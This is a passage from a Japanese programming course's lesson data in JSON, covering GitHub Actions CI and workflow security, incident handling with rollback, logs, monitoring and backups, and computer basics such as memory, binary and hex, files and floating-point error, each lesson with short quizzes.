3.12 と 3.13 |\n| `${{ ... }}` | GitHub Actions の式。`matrix.python-version` や `secrets.API_KEY` の値に置き換わる |\n| `env:` | そのステップだけの環境変数（レッスン 4） |\n| `secrets.API_KEY` | リポジトリの Settings → Secrets and variables → Actions に登録した値。ログには `***` と表示される |\n\nPR を作ると、画面の **Checks** にこのテストの結果が ✅ / ❌ で出ます（ターミナルと Git のコースのレッスン 6）。リポジトリの設定（Branch protection / Rulesets）で、**テストが ✅ でないとマージできない** ようにもできます。\n\n### 失敗したら\n\nActions のタブで、失敗した実行 → 失敗した job → 赤くなったステップを開くと、**ターミナルと同じ出力** が見られます。エラーの読み方は、はじめてのコースの「エラーメッセージはヒントの手紙」と同じです。\n\n| よくある失敗 | 原因 |\n|---|---|\n| `ModuleNotFoundError` | `requirements.txt` に書き忘れたライブラリ（手元にだけ入っている） |\n| 手元では通るテストが落ちる | OS（Linux）・時刻（UTC）・ファイル名の大文字小文字の違い（レッスン 1） |\n| `secrets.XXX` が空 | Secrets に登録していない。または、フォークからの PR には秘密が渡されない（安全のため） |\n| YAML のエラー | インデント（字下げ）のずれ。スペースで書く（タブは使えない） |\n\n## ワークフローの安全\n\nワークフローは、**リポジトリの権限と秘密を持って動くプログラム** です。ここが乗っ取られると被害が大きくなります。\n\n| 見ること | ✅ | ⚠️ |\n|---|---|---|\n| `permissions:` | 必要なものだけ（`contents: read` から始める） | 書いていない（古いリポジトリでは強い権限になることがある）、`write-all` |\n| `uses:` のバージョン | `@v4` など固定。より厳しくするなら、コミットの ID（`@a1b2c3...`）で固定 | `@main`（作者が変えると、知らないうちに中身が変わる） |\n| 秘密の扱い | `secrets.` から読み、`echo` しない | 秘密をコマンドの出力やファイルに書き出す |\n| PR のタイトルなどを `run:` に | 環境変数にしてから使う | `run: echo \"${{ github.event.pull_request.title }}\"`（タイトルにコマンドを仕込める。セキュリティのコースのレッスン 3 と同じ「インジェクション」） |\n| `pull_request_target` | 使い方をよく理解しているときだけ | フォークからのコードを、秘密を持ったまま実行してしまう |\n\n## AI のコードではこう出てくる\n\nAI に「GitHub Actions でテストを自動化して」と頼むと、上のようなファイルを作ってくれます。読むときは次の順で見ます。\n\n1. **`on:`**：いつ動く？（push だけ？PR でも？手動？）\n2. **`permissions:`**：何ができる？（必要以上に強くない？）\n3. **`steps:`**：何をする？（`run:` のコマンドを 1 行ずつ。ターミナルのコースで読めるはず）\n4. **`secrets.`**：どの秘密を使う？（Settings に登録が必要）\n5. **デプロイするなら**：どのブランチの、どのきっかけで本番に出る？\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`on: pull_request:` と書いたワークフローが動くのはいつ？",
        "choices": [
         "main に push したときだけ",
         "プルリクエストが作られた・更新されたとき",
         "毎日決まった時間"
        ],
        "answer": 1,
        "explain": "PR のたびにテストを回すのが CI の基本の形です。結果は PR の Checks に表示されます。"
       },
       {
        "question": "このリポジトリの自動マージで、`concurrency: group: auto-merge-main` がある理由は？",
        "choices": [
         "ワークフローを速くするため",
         "2 つの push がほぼ同時に来ても、マージを 1 つずつ順番に行うため",
         "main ブランチを守るため、マージを禁止している"
        ],
        "answer": 1,
        "explain": "同時に 2 つが main に push しようとすると、後のほうが失敗します。同じグループのものは順番待ちになります。"
       },
       {
        "question": "ワークフローで `uses: someone/deploy-action@main` と書くことの心配な点は？",
        "choices": [
         "動作が遅くなる",
         "作者が main を書き換えると、知らないうちに違う中身が、自分のリポジトリの権限と秘密を持って実行される",
         "main という名前のブランチが必要になる"
        ],
        "answer": 1,
        "explain": "部品のバージョンを固定しないと、中身が勝手に変わります。`@v4` などのバージョンや、コミットの ID で固定します（セキュリティのコースのレッスン 6 と同じ考え方）。"
       }
      ]
     ],
     "id": "07-ci-cd-actions"
    },
    {
     "title": "本番で困ったとき ― ログ・監視・ロールバック・バックアップ",
     "level": 4,
     "minutes": 18,
     "concepts": [
      "deploy",
      "errors",
      "testing"
     ],
     "summary": "公開した後に「動かない」と言われたときの順番。まず戻す（ロールバック）、ログを読む、監視で先に気づく、バックアップから戻す。事故の後のふり返りまで。",
     "body": "## このレッスンのゴール\n\n- 本番で問題が起きたとき、何から順にやるかを説明できる\n- ロールバック・ログ・監視・バックアップの役割を説明できる\n- 「戻せる」状態を、公開する前から用意しておく理由が分かる\n\n## 問題が起きたときの順番\n\n```text\n① 気づく     ……  監視・アラート、利用者からの連絡\n② 被害を止める ……  まず戻す（ロールバック）。原因探しは後\n③ 原因を探す   ……  ログ・エラー・直前の変更\n④ 直す        ……  修正 → テスト → もう一度公開\n⑤ ふり返る     ……  なぜ起きた？次はどう防ぐ？\n```\n\nいちばん大事なのは ② です。**原因が分からなくても、直前の状態に戻せば、多くの場合すぐに直ります**。本番が壊れたまま原因を探すと、その間ずっと利用者が困ります。\n\n## ロールバック：前の版に戻す\n\n| 公開の方法 | 戻し方 |\n|---|---|\n| Git の push で自動公開（このサイト、Vercel など） | 原因のコミットを `git revert` して push（ターミナルと Git のコースのレッスン 7） |\n| Vercel・Netlify・Cloudflare Pages・Render | 管理画面の「過去のデプロイ」から、前の版を選んで「Rollback」「Promote」 |\n| Cloudflare Workers | `npx wrangler rollback`（前の版に戻す） |\n| Docker のイメージ | 前のタグ（`hello-api:1.4.2`）のイメージで起動し直す |\n\n⚠️ **データベースの変更（マイグレーション）は、コードと一緒に戻らない** ことに注意します。列を消すマイグレーションを本番で実行した後にコードだけ戻すと、古いコードが「無い列」を使おうとして、さらに壊れます。\nそのため、列を消す・名前を変えるような変更は、**① 新しい列を足す → ② コードを新しい列に切り替える → ③ 古い列を消す** のように、何回かに分けて安全に進めるのが定番です。\n\n## ログを読む\n\nログは、プログラムが「何をしたか」を書き残した記録です（バックエンドコースのレッスン 10）。\n\n```text\n2026-11-21T08:12:03Z INFO  GET /tasks 200 12ms\n2026-11-21T08:12:05Z ERROR POST /orders 500 user_id=42\nTraceback (most recent call last):\n  ...\n  File \"/app/orders.py\", line 31, in create_order\n    total = price * qty\nTypeError: unsupported operand type(s) for *: 'NoneType' and 'int'\n```\n\n| 読み方 | この例では |\n|---|---|\n| 時刻（多くは UTC） | 日本時間では 17:12。「何時ごろから？」と照らし合わせる |\n| レベル | `ERROR` を探す。`INFO` は普通の記録 |\n| どのリクエスト | `POST /orders` で 500 |\n| エラーの最後の行 | `price` が `None` だった。値段の無い商品が原因かも |\n| いつから？ | 最初の `ERROR` の時刻と、**直前のデプロイの時刻** を比べる |\n\n| どこで見る | |\n|---|---|\n| PaaS・サーバーレス | 管理画面の「Logs」。Workers は `npx wrangler tail` で流れてくるログを見られる |\n| Docker | `docker logs コンテナ名`（レッスン 6） |\n| GitHub Actions | Actions のタブ（レッスン 7） |\n\n⚠️ ログに **パスワード・トークン・個人情報** を書かないこと。ログは多くの人が見られる場所に、長く残ります。\n\n## 監視：利用者より先に気づく\n\n| 種類 | 何を見る | 道具の例 |\n|---|---|---|\n| **死活監視** | サイトが応答するか（数分ごとにアクセスしてみる） | UptimeRobot、Better Stack、Cloudflare のヘルスチェック |\n| **エラー監視** | 起きた例外を集めて、まとめて知らせる | Sentry |\n| **数値の監視** | リクエスト数・エラー率・応答時間・CPU・メモリ | 各クラウドの管理画面、Grafana |\n| **料金の監視** | 請求額 | 予算のアラート（レッスン 5） |\n\n```python\n@app.get(\"/health\")\ndef health():\n    conn.execute(\"SELECT 1\")        # データベースにもつながるか確かめる\n    return {\"status\": \"ok\"}\n```\n\n死活監視のために、**「元気かどうか」だけを返す入口**（ヘルスチェック）を作っておくのが定番です。\n\nアラートは **多すぎても少なすぎてもいけません**。毎日何十通も届くと、本当に大事な知らせを見落とします。「利用者が困っている」ときだけ鳴るようにします。\n\n## バックアップ：最後の砦\n\nコードは Git に全部残っていますが、**利用者のデータは Git にはありません**。データベースが壊れた・間違って消した、に備えるのがバックアップです。\n\n| 確認すること | |\n|---|---|\n| 自動で取られているか | 多くのクラウドのデータベースには自動バックアップがある。無料プランでは無い・短いことも |\n| どこまで戻れるか | 毎日 1 回？任意の時点（D1 の Time Travel など）？何日前まで？ |\n| **戻せることを確かめたか** | 一度も戻したことのないバックアップは、本当に使えるか分からない。試しに別の場所に戻してみる |\n| 同じ場所に置いていないか | サービスごと使えなくなったときのために、別の場所にもコピー |\n\n## ふり返り：同じことを起こさない\n\n直ったら、**誰かを責めるのではなく、仕組みを直す** ためのふり返りをします。\n\n```text\n何が起きた？   ：17:12〜17:40、注文ができなかった\n原因は？       ：値段の無い商品を登録できてしまい、計算で None になった\nなぜ防げなかった？：データベースに NOT NULL が無かった。テストにも無かった\n次の対策       ：price に NOT NULL と CHECK を追加（データベース設計のコース）\n                テストに「値段の無い商品」のケースを追加\n                エラー監視を入れて、5 分以内に気づけるように\n```\n\nこのコースのあちこちで学んだこと（制約・テスト・ログ・監視）は、こうして **事故の後に、少しずつ足されていく** ものでもあります。\n\n## AI に手伝ってもらうとき\n\n本番の問題を AI に相談するときは、次をそろえて伝えると、的外れな答えが減ります（AI と開発するコースの「伝わる頼み方」）。\n\n- **いつから** 起きているか、直前に何を変えたか（デプロイの時刻・PR）\n- **エラーのログ**（秘密や個人情報は伏せる）\n- 手元では再現するか\n- すでに試したこと\n\n⚠️ AI が「本番のデータベースで、この SQL を実行してください」と言ってきたら、**バックアップがあるか確かめてから**、まずは手元やステージングで試します。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "公開した直後から注文ができなくなった。原因はまだ分からない。最初にすべきことは？",
        "choices": [
         "ログを全部読んで、原因が分かるまで待つ",
         "直前の版にロールバックして、まず利用者が困らない状態に戻す",
         "データベースを作り直す"
        ],
        "answer": 1,
        "explain": "被害を止めるのが先です。原因が分からなくても、直前の版に戻せば多くの場合すぐ直ります。原因探しはその後で行います。"
       },
       {
        "question": "列を削除するマイグレーションを本番で実行した後、コードだけを前の版に戻した。何が起きうる？",
        "choices": [
         "何も問題はない",
         "古いコードが、もう無い列を使おうとしてエラーになる",
         "削除した列が自動で元に戻る"
        ],
        "answer": 1,
        "explain": "データベースの変更はコードと一緒に戻りません。列の削除などは、何回かに分けて安全に進めます。"
       },
       {
        "question": "バックアップについて、もっとも大事な確認は？",
        "choices": [
         "毎秒取っているか",
         "実際に戻せることを、一度試して確かめているか",
         "できるだけ大きなファイルになっているか"
        ],
        "answer": 1,
        "explain": "戻したことのないバックアップは、いざというとき使えるか分かりません。試しに戻してみて確かめます。"
       }
      ]
     ],
     "id": "08-operations"
    }
   ],
   "status": "open"
  },
  {
   "title": "コンピュータの基礎",
   "icon": "💻",
   "order": 160,
   "category": "topic",
   "description": "プログラムが動く土台。CPU とメモリ、2 進数、ファイル、数値の誤差、文字コード、プロセスとスレッド。AI のコードの「なぜ遅い？なぜ化ける？なぜずれる？」が分かるようになる。",
   "levels": {
    "1": "入門：中身をのぞく",
    "2": "基礎：つまずきの正体"
   },
   "id": "160-computer-basics",
   "lessons": [
    {
     "title": "CPU・メモリ・ストレージ ― 作業机のたとえ",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "hardware",
      "performance"
     ],
     "summary": "プログラムを動かす 3 つの部品の役割と、「メモリが足りない」「重い」が起きる理由。",
     "body": "## このレッスンのゴール\n\n- CPU・メモリ・ストレージの役割を、たとえを使って説明できる\n- 「プログラムを実行する」とき、この 3 つの間で何が起きているか分かる\n- AI のコードで、メモリを使いすぎる書き方に気づける\n\n## 3 つの部品は「作業する人・机・本棚」\n\n| 部品 | たとえ | 役割 | 電源を切ると |\n|---|---|---|---|\n| **CPU** | 作業する人 | 計算・比較・命令の実行 | — |\n| **メモリ（RAM）** | 作業机 | 今使っているデータとプログラムを置く場所。**速いが狭い** | **消える** |\n| **ストレージ**（SSD・HDD） | 本棚 | ファイルをしまっておく場所。**広いが遅い** | 残る |\n\nパソコンの「メモリ 16GB・SSD 512GB」は、「机の広さが 16GB、本棚の広さが 512GB」という意味です。\n\n## プログラムを実行すると何が起きるか\n\n```text\n① ダブルクリック（または python main.py）\n② ストレージ（本棚）から、プログラムとデータをメモリ（机）に運ぶ\n③ CPU（人）が、机の上の命令を 1 つずつ読んで実行する\n④ 結果をファイルに保存するときは、またストレージ（本棚）に戻す\n```\n\nPython の変数（`x = 10`）は、**メモリの上に置かれた値に名前を付けたもの** です。だからプログラムを終了すると変数の中身は消え、残したいものはファイルやデータベース（ストレージ）に保存します。\n\n## どれくらい速さが違うのか\n\n正確な数字は機械によって違いますが、だいたいの感覚はこうです。\n\n| どこから読む | 1 回にかかる時間の目安 | 人間の感覚に直すと |\n|---|---|---|\n| CPU の中（キャッシュ） | 1 ナノ秒前後 | 1 秒 |\n| メモリ | 100 ナノ秒前後 | 1〜2 分 |\n| SSD | 数十〜100 マイクロ秒前後 | 1 日 |\n| インターネットの向こうのサーバー | 数十〜数百ミリ秒 | 数年 |\n\n（1 ミリ秒 = 1000 マイクロ秒 = 100 万ナノ秒）\n\nここから分かる大事なこと：**「ファイルを読む」「ネットワークにアクセスする」は、計算に比べてものすごく遅い**。\nバックエンドコースのレッスン 14（N+1 問題）で、データベースへの問い合わせを 1 回にまとめると速くなったのは、この差のためです。\n\n## 机が狭いと何が起きるか\n\nメモリが足りなくなると、OS（Windows や macOS）は机の上のものを一時的に本棚へ逃がして、なんとか続けようとします（スワップ）。本棚は遅いので、**パソコン全体が急に重くなります**。それでも足りないと、プログラムが止まります。\n\n```python\nimport sys\nprint(sys.getsizeof(list(range(1_000_000))))   # 8000056（約 8MB。中身の数値はこれとは別に必要）\n```\n\nPython のリストは、100 万個の数値を入れると、**入れ物だけで約 8MB** 使います（実際に実行して確認）。何千万件にもなると、机からあふれます。\n\n## AI のコードではこう出てくる\n\n大きなファイルを扱うコードは、**一度に全部を机に広げているか** を見ます。\n\n```python\n# ⚠️ ファイル全体を一度にメモリに読み込む\nwith open(\"huge.log\", encoding=\"utf-8\") as f:\n    lines = f.readlines()          # 10GB のファイルなら 10GB 以上の机が必要\nfor line in lines:\n    ...\n\n# ✅ 1 行ずつ読む（机に置くのは常に 1 行分だけ）\nwith open(\"huge.log\", encoding=\"utf-8\") as f:\n    for line in f:\n        ...\n```\n\n| 書き方 | メモリ | 向いている場面 |\n|---|---|---|\n| `f.read()` / `f.readlines()` | ファイル全体分 | 小さい設定ファイルなど |\n| `for line in f:` | 1 行分 | ログ・CSV など大きくなりうるファイル |\n| `pandas.read_csv(..., chunksize=10000)` | 1 万行分ずつ | 大きな CSV をまとめて処理するとき |\n\nJavaScript（Node.js）でも同じで、`fs.readFileSync` は全部読み込み、`fs.createReadStream` は少しずつ読みます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "電源を切ると中身が消えるのはどれ？",
        "choices": [
         "SSD",
         "メモリ（RAM）",
         "HDD"
        ],
        "answer": 1,
        "explain": "メモリは作業机です。速い代わりに、電源が切れると内容が消えます。残したいものはストレージに保存します。"
       },
       {
        "question": "プログラムが遅いとき、まず疑うべきことは？",
        "choices": [
         "CPU の足し算が遅い",
         "ファイルやネットワークへのアクセスを何度もしている",
         "変数の名前が長い"
        ],
        "answer": 1,
        "explain": "計算に比べて、ストレージやネットワークへのアクセスは何万倍も遅いです。回数を減らすのが一番効きます。"
       },
       {
        "question": "10GB のログファイルを処理するコードとして安全なのは？",
        "choices": [
         "`lines = f.readlines()` で全部読んでから処理する",
         "`text = f.read()` で 1 つの文字列にする",
         "`for line in f:` で 1 行ずつ処理する"
        ],
        "answer": 2,
        "explain": "1 行ずつなら、メモリに置くのは常に 1 行分だけで済みます。"
       }
      ]
     ],
     "id": "01-cpu-memory"
    },
    {
     "title": "2 進数・16 進数とデータの量",
     "level": 1,
     "minutes": 15,
     "concepts": [
      "encoding",
      "types"
     ],
     "summary": "コンピュータの中は 0 と 1。ビットとバイト、KB と KiB、AI のコードに出てくる 0b・0x・#ff8800 の読み方。",
     "body": "## このレッスンのゴール\n\n- ビット・バイトと、KB・MB・GB の関係を説明できる\n- 2 進数・16 進数の数を、10 進数に直せる（または Python で直し方が分かる）\n- コードに出てくる `0b1010`・`0xff`・`#ff8800` が何か分かる\n\n## コンピュータの中は 0 と 1\n\nコンピュータの部品は、電気が「流れている／流れていない」の 2 つの状態しか区別できません。そこで、すべてのデータを **0 と 1 の並び** で表します。\n\n| 単位 | 中身 | 表せる種類 |\n|---|---|---|\n| **ビット（bit）** | 0 か 1 の 1 つ | 2 通り |\n| **バイト（byte）** | 8 ビット | 2⁸ = **256 通り**（0〜255） |\n\n8 ビット = 1 バイトが、データの大きさを数える基本の単位です。\n\n## 2 進数：2 になったら繰り上がる\n\n10 進数は「10 で繰り上がる」、2 進数は「2 で繰り上がる」数え方です。\n\n| 10 進数 | 0 | 1 | 2 | 3 | 4 | 5 | … | 10 | 255 |\n|---|---|---|---|---|---|---|---|---|---|\n| 2 進数 | 0 | 1 | 10 | 11 | 100 | 101 | … | 1010 | 11111111 |\n\n```python\nprint(bin(10))              # '0b1010'  10 進数 → 2 進数\nprint(int(\"1010\", 2))       # 10        2 進数の文字列 → 10 進数\nprint(format(5, \"08b\"))     # '00000101' 8 桁にそろえる\n```\n\n`0b` は「この後は 2 進数」という目印です。\n\n## 16 進数：2 進数を短く書く方法\n\n2 進数は桁が多すぎて読みにくいので、**4 ビットずつまとめて 1 文字** にした 16 進数がよく使われます。0〜9 の次は a〜f（10〜15）です。\n\n| 2 進数 | 0000 | 1001 | 1010 | 1111 | 1111 1111 |\n|---|---|---|---|---|---|\n| 16 進数 | 0 | 9 | a | f | ff |\n| 10 進数 | 0 | 9 | 10 | 15 | 255 |\n\n**1 バイト（8 ビット）は 16 進数のちょうど 2 文字**（00〜ff）になります。\n\n```python\nprint(hex(255))          # '0xff'\nprint(int(\"ff\", 16))     # 255\nprint(0xff)              # 255   ← コードの中に 16 進数で直接書ける\n```\n\n### コードのあちこちに出てくる 16 進数\n\n| 見かける場所 | 例 | 意味 |\n|---|---|---|\n| CSS の色 | `#ff8800` | 赤 ff（255）・緑 88（136）・青 00（0）＝ オレンジ |\n| 文字のバイト列 | `b'\\xe3\\x81\\x82'` | 「あ」の UTF-8 での 3 バイト（レッスン 5） |\n| Git のコミット ID | `9f1d485` | 長い 16 進数の先頭 7 文字 |\n| UUID | `11111111-2222-3333-...` | 16 進数 32 文字のランダムな ID |\n| メモリの番地 | `<object at 0x7f3a2c...>` | Python がオブジェクトを表示したときの置き場所 |\n\nJavaScript でも `0xff`・`0b1010` と書けます。変換は `(255).toString(2)` → `\"11111111\"`、`parseInt(\"ff\", 16)` → `255` です（実行して確認）。\n\n## データの量：KB と KiB\n\n| 単位 | 1000 で数える（SI） | 1024 で数える（2 進） |\n|---|---|---|\n| キロ | 1 **KB** = 1,000 バイト | 1 **KiB** = 1,024 バイト |\n| メガ | 1 **MB** = 1,000,000 バイト | 1 **MiB** = 1,048,576 バイト |\n| ギガ | 1 **GB** = 10 億バイト | 1 **GiB** = 約 10.7 億バイト |\n\n本来は区別しますが、実際には **1024 で数えているのに KB・MB と書く** ことがよくあります（Windows のエクスプローラーなど）。\n「500GB の SSD を買ったのに、Windows では 465GB と表示される」のは、メーカーが 1000 で、Windows が 1024 で数えているためです。\n\n### 量の感覚\n\n| もの | だいたいの大きさ |\n|---|---|\n| 半角英数字 1 文字 | 1 バイト |\n| 日本語 1 文字（UTF-8） | 3 バイト |\n| テキストだけのメール | 数 KB |\n| スマホの写真 1 枚 | 数 MB |\n| 1 時間の動画 | 数 GB |\n\n## AI のコードではこう出てくる\n\n```python\nMAX_UPLOAD = 5 * 1024 * 1024      # 5MiB（5MB と書かれていることが多い）\nif len(data) > MAX_UPLOAD:\n    raise ValueError(\"ファイルが大きすぎます\")\n```\n\n`1024 * 1024` を見たら「メガ」、`1024 ** 3` を見たら「ギガ」と読めば OK です。\n`chmod 755`（ファイルの権限）、`0o755` のような数字は **8 進数**（8 で繰り上がる）で、3 ビットずつまとめた書き方です。ターミナルと Git のコースで出てきます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "1 バイトで表せる種類はいくつ？",
        "choices": [
         "8 通り",
         "16 通り",
         "256 通り"
        ],
        "answer": 2,
        "explain": "1 バイトは 8 ビットなので、2 を 8 回かけた 256 通り（0〜255）です。"
       },
       {
        "question": "CSS の色 `#00ff00` は何色？",
        "choices": [
         "赤",
         "緑",
         "青"
        ],
        "answer": 1,
        "explain": "2 文字ずつ 赤・緑・青 の順です。00 / ff / 00 なので、緑だけが最大の色です。"
       },
       {
        "question": "`5 * 1024 * 1024` は何を表している可能性が高い？",
        "choices": [
         "5 キロバイト",
         "5 メガバイト（正確には 5MiB）",
         "5 ギガバイト"
        ],
        "answer": 1,
        "explain": "1024 を 2 回かけると「メガ」、3 回かけると「ギガ」です。"
       }
      ]
     ],
     "id": "02-binary-data-size"
    },
    {
     "title": "ファイルの正体 ― テキストとバイナリ・拡張子・改行",
     "level": 1,
     "minutes": 14,
     "concepts": [
      "hardware",
      "io",
      "encoding"
     ],
     "summary": "ファイルは「名前の付いたバイトの並び」。テキストとバイナリの違い、拡張子の本当の意味、Windows と Mac で違う改行コード。",
     "body": "## このレッスンのゴール\n\n- ファイルが「バイトの並び」であることと、テキストファイル・バイナリファイルの違いを説明できる\n- 拡張子が何を決めていて、何を決めていないかが分かる\n- `open(..., \"rb\")`・改行コード `\\r\\n` が出てくるコードを読める\n\n場所（パス）の書き方は、ターミナルと Git のコースのレッスン 1 でくわしく扱います。\n\n## ファイル ＝ 名前の付いたバイトの並び\n\nストレージ（レッスン 1 の本棚）に入っているのは、どんなファイルも **バイト（0〜255 の数）の並び** です。\nその並びを「文字として読む約束」で作ったものが **テキストファイル**、それ以外が **バイナリファイル** です。\n\n| | テキストファイル | バイナリファイル |\n|---|---|---|\n| 中身 | 文字コード（レッスン 5）で文字を表したバイト | 画像・音声・圧縮データなど、文字ではないバイト |\n| 例 | `.py` `.js` `.txt` `.csv` `.json` `.md` `.html` | `.png` `.jpg` `.mp3` `.zip` `.xlsx` `.exe` |\n| メモ帳で開くと | 読める | 意味不明な記号だらけ |\n\n```python\nwith open(\"memo.txt\", \"rb\") as f:        # \"rb\" = バイトのまま読む（read binary）\n    print(f.read())\n# b'\\xe8\\xb2\\xb7\\xe3\\x81\\x84\\xe7\\x89\\xa9\\n\\xe3\\x82\\x8a...'   ← 「買い物」「りんご」の UTF-8\n\nwith open(\"photo.png\", \"rb\") as f:\n    print(f.read(8))                      # 先頭 8 バイトだけ\n# b'\\x89PNG\\r\\n\\x1a\\n'                   ← PNG 画像は必ずこの 8 バイトで始まる\n```\n\n（どちらも実際に実行した結果です。`b'...'` はバイト列、`\\xe8` は 16 進数で書いた 1 バイト。レッスン 2）\n\n### 画像をテキストとして開くと\n\n```python\nopen(\"photo.png\", encoding=\"utf-8\").read()\n# UnicodeDecodeError: 'utf-8' codec can't decode byte 0x89 in position 0: invalid start byte\n```\n\n「0 番目のバイト 0x89 は UTF-8 の文字として読めません」というエラーです。画像はバイナリなので、`\"rb\"` で開く必要があります。\n\n| `open` のモード | 意味 | 返ってくるもの |\n|---|---|---|\n| `\"r\"`（省略時） | テキストとして読む | `str`（文字列） |\n| `\"w\"` | テキストとして書く（**中身を消してから**） | |\n| `\"a\"` | テキストとして末尾に追加 | |\n| `\"rb\"` / `\"wb\"` | バイトのまま読む／書く | `bytes` |\n\n⚠️ `\"w\"` は、開いた瞬間に元の中身が消えます。AI のコードで、大事なファイルを `\"w\"` で開いていないか確認しましょう。\n\n## 拡張子は「名札」にすぎない\n\n`report.final.csv` の **最後の `.` から後ろ（`.csv`）が拡張子** です。\n\n```python\nfrom pathlib import Path\np = Path(\"data/2026/report.final.csv\")\np.name     # 'report.final.csv'\np.stem     # 'report.final'\np.suffix   # '.csv'\np.parent   # data/2026\n```\n\n拡張子が決めているのは、**どのアプリで開くか（OS の目安）だけ** です。中身は変わりません。\n\n- `photo.png` を `photo.txt` に名前を変えても、中身は画像のまま（テキストとして読むと上と同じエラーになることを確認しました）\n- だから、アップロードされたファイルを **拡張子だけで判断するのは危険** です。`.jpg` という名前のプログラムが送られてくることもあります\n\n⚠️ Windows は初期設定で **拡張子を隠します**。`memo.txt` が `memo` と表示され、`memo.txt.txt` のような二重の名前に気づけないことがあります。エクスプローラーの「表示」→「ファイル名拡張子」をオンにしておくのがおすすめです。\n\n## 隠しファイル\n\n名前が `.` で始まるファイルやフォルダ（`.git`、`.env`、`.gitignore`）は、Mac や Linux では **隠しファイル** として扱われ、普段は見えません。\n開発ではこれらが重要な役割を持ちます（`.env` は秘密情報、`.git` は Git の記録）。「無いはず」のファイルが実はあることがあるので注意しましょう。\n\n## 改行コード：Windows だけ違う\n\nテキストの「改行」も、実はバイトです。\n\n| OS | 改行のバイト | 書き方 |\n|---|---|---|\n| Mac・Linux | 1 バイト（0x0a） | `\\n`（LF） |\n| Windows（昔からの習慣） | 2 バイト（0x0d 0x0a） | `\\r\\n`（CRLF） |\n\n```python\nopen(\"w.txt\", \"w\", encoding=\"utf-8\", newline=\"\\r\\n\").write(\"a\\nb\\n\")\nopen(\"w.txt\", \"rb\").read()       # b'a\\r\\nb\\r\\n'   ← \\n が \\r\\n で保存された\n```\n\nPython は普段、OS に合わせて自動で変換してくれます。困るのは次のような場面です。\n\n- Git の差分で、**中身は変えていないのに全行が「変更あり」** になる（改行コードだけが変わった）\n- Windows で作ったシェルスクリプトを Linux で動かすと `$'\\r': command not found` というエラーが出る\n- CSV の行の最後に、見えない `\\r` が残る\n\nこのリポジトリにも、改行コードをそろえるための `.gitattributes` というファイルが入っています。\n\n## AI のコードではこう出てくる\n\n| 書き方 | 読み方 |\n|---|---|\n| `open(path, \"rb\")` / `\"wb\"` | 画像・PDF・zip などをバイトのまま扱っている |\n| `Path(...).suffix.lower() == \".png\"` | 拡張子で判定している（名札だけを見ている） |\n| `encoding=\"utf-8\"` | テキストの文字コードを指定（レッスン 5。付いていないと Windows で文字化けすることがある） |\n| `newline=\"\"` | CSV を書くときの定番。`csv` モジュールに改行を任せる |\n| `.strip()` | 行の最後の `\\n`・`\\r\\n`・空白を取り除く |\n\nJavaScript（Node.js）では、`fs.readFileSync(path)` がバイト（Buffer）、`fs.readFileSync(path, \"utf8\")` が文字列を返します。Python の `\"rb\"` と `\"r\"` の違いと同じです。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`photo.png` の名前を `photo.txt` に変えたら、中身はどうなる？",
        "choices": [
         "テキストファイルに変換される",
         "中身は画像のバイトのまま変わらない",
         "ファイルが壊れて開けなくなる"
        ],
        "answer": 1,
        "explain": "拡張子は名札にすぎません。中身のバイトは同じなので、テキストとして読もうとするとエラーになります。"
       },
       {
        "question": "画像ファイルを読むときの正しい `open` のモードは？",
        "choices": [
         "`\"r\"`",
         "`\"w\"`",
         "`\"rb\"`"
        ],
        "answer": 2,
        "explain": "画像はバイナリなので、文字として読まずにバイトのまま読みます（read binary）。"
       },
       {
        "question": "Windows で編集しただけなのに、Git で全部の行が変更扱いになった。考えられる原因は？",
        "choices": [
         "改行コードが LF から CRLF に変わった",
         "ファイルの拡張子が変わった",
         "Git が壊れた"
        ],
        "answer": 0,
        "explain": "改行も 1 つのバイトです。`\\n` が `\\r\\n` に変わると、全行が別の内容として扱われます。"
       }
      ]
     ],
     "id": "03-files"
    },
    {
     "title": "数値の落とし穴 ― 0.1 + 0.2 が 0.3 にならない",
     "level": 2,
     "minutes": 15,
     "concepts": [
      "encoding",
      "types",
      "operators"
     ],
     "summary": "小数の誤差、四捨五入のずれ、JavaScript の大きな整数。お金や ID を扱う AI のコードで必ず見るポイント。",
     "body": "## このレッスンのゴール\n\n- `0.1 + 0.2` がぴったり `0.3` にならない理由を説明できる\n- お金の計算で、AI のコードが誤差に対応しているか確認できる\n- JavaScript で大きな整数（ID など）が化ける理由が分かる\n\n## 0.1 + 0.2 = 0.30000000000000004\n\n```python\nprint(0.1 + 0.2)           # 0.30000000000000004\nprint(0.1 + 0.2 == 0.3)    # False\n```\n\nバグではなく、Python・JavaScript・Java など **ほぼすべての言語で同じ結果** になります（Python と JavaScript で実行して確認）。\n\n### 理由：2 進数では 0.1 を正確に書けない\n\n10 進数で 1/3 を書くと `0.3333…` と永遠に続くように、**2 進数（レッスン 2）では 0.1 が永遠に続く** 小数になります。\nコンピュータは小数（`float`）を決まった桁数（64 ビット）で持つので、途中で切った **ほんの少しずれた値** を覚えています。\n\n```python\nfrom decimal import Decimal\nprint(Decimal(0.1))\n# 0.1000000000000000055511151231257827021181583404541015625   ← 実際に覚えている値\n```\n\n普段は表示のときに丸められて `0.1` に見えますが、計算を重ねるとずれが表に出てきます。\n\n## 対策 1：小数を `==` で比べない\n\n```python\nimport math\nmath.isclose(0.1 + 0.2, 0.3)      # True  「ほぼ等しい」で比べる\n```\n\nJavaScript では `Math.abs(a - b) < Number.EPSILON` のように書きます。\n\n## 対策 2：お金は小数で計算しない\n\n| 方法 | 例 | 使う場面 |\n|---|---|---|\n| **整数（いちばん小さい単位）で持つ** | 1980 円は `1980`、12.34 ドルは `1234`（セント） | 多くの決済サービス（Stripe など）が採用 |\n| **`Decimal` を使う**（Python） | `Decimal(\"0.1\") + Decimal(\"0.2\")` → `Decimal('0.3')` | 税率・利率などの計算 |\n| データベースの `DECIMAL` / `NUMERIC` 型 | `price NUMERIC(10, 2)` | 金額の列 |\n\n```python\nDecimal(\"0.1\") + Decimal(\"0.2\")   # Decimal('0.3')     ← 文字列から作る\nDecimal(0.1)                      # 0.1000000000000000055…  ← float から作るとずれごと入る\n```\n\n⚠️ `Decimal(0.1)` のように **float から作ると意味がありません**。必ず文字列 